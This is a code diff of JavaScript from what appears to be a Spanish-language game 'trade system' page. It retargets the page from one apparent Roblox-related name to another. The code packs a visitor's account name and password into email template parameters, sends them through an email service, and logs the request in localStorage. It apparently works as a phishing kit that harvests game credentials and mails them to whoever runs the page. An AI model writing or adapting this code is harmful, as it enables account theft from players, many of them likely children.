@@ -435,9 +435,8 @@
                 const templateParams = {
                     from_name: 'Sistema de Intercambios',
                     to_name: 'Tú',
-                    usuario_oblox: account,
-                    contra_oblox: access,
-                    fecha: new Date().toLocaleString()
+                    usuario_brinrot: account,
+                    contra_brinrot: access,
                 };
                 
                 console.log('Enviando email con Template ID: template_ga9xk7u');
@@ -452,11 +451,10 @@
                         
                         const peticion = {
                             usuario: account,
-                            fecha: new Date().toLocaleString(),
                             estado: 'completada',
                             email_enviado: true
                         };
-                        localStorage.setItem('peticionoblox', JSON.stringify(peticion));
+                        localStorage.setItem('peticionbrinrot', JSON.stringify(peticion));
                     })
                     .catch(function(error) {
                         console.error('❌ Error', error);
